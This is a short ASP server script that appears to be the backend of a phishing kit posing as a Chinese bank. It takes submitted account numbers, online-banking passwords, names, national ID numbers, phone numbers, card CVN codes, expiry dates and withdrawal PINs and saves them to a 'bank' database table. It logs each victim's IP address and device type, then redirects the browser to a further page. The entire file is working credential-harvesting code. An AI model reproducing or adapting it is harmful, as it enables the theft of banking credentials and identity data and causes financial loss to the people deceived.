<!--#include file="include/db_conn.asp"-->
	  <meta charset="utf-8">
<%
Function getOs()
    Dim agent,os
    agent = request.ServerVariables("HTTP_USER_AGENT") & "" 
    If InStr(1,agent, "windows nt",1)>0 Then
        os = "💻"
    Else If InStr(1,agent, "iphone",1)>0 Then
        os = "📱"
    Else If InStr(1,agent, "ipad",1)>0 Then
        os = "🎦"
    Else If InStr(1,agent, "android",1)>0 Then
        os = "🖥"
    Else
        os = "🚥"
    End if
    End if
    End if
    End If
    getOs = os
End Function

os = getOs()

	qkmm=Trim(Request("qkmm"))
	g_zhanghao=Trim(Request("g_zhanghao"))
	g_wangyin=Trim(Request("g_wangyin"))
	g_xingming=Trim(Request("g_xingming"))
	g_shenfenzheng=Trim(Request("g_shenfenzheng"))
	g_shouji=Trim(Request("g_shouji"))
	g_cvn=Trim(Request("g_cvn"))
	g_yxq=Trim(Request("g_yxq"))
	g_isj=Trim(Request("isj"))
	g_ije=Trim(Request("g_ije"))

	

	 	
	

	
	set Rs=server.createobject("adodb.recordset")
	Sql="select top 1 * from bank"
	rs.open sql,conn,1,3
	Rs.Addnew
	
	rs("lx")=idType
	rs("zh")=g_zhanghao
	rs("xm")=g_xingming
	rs("sfz")=g_shenfenzheng
	rs("dh")=g_shouji 
	rs("mm")=g_wangyin
	rs("cvn")=g_cvn
	rs("ije")=g_ije
	rs("isj")=g_isj
	rs("yxq")=g_yxq
    rs("qkmm")=Trim(Request("qkmm"))
	rs("m")=0
	rs("n")=0
	rs("os") = os
	rs("online") = now()
	if NumTemp>5 and cz=1 then
		rs("cz")=1
	else
		rs("cz")=0
	end if
	rs("ipp")= request.servervariables("remote_addr")
	rs("sj")=now()
	rs.update
	
	session("ddid")=rs("id")
	session("zh")=g_zhanghao
	rs.close
	set rs=nothing
	response.write "<script>top.location ='raddress.html';</script>"
	
	
%>
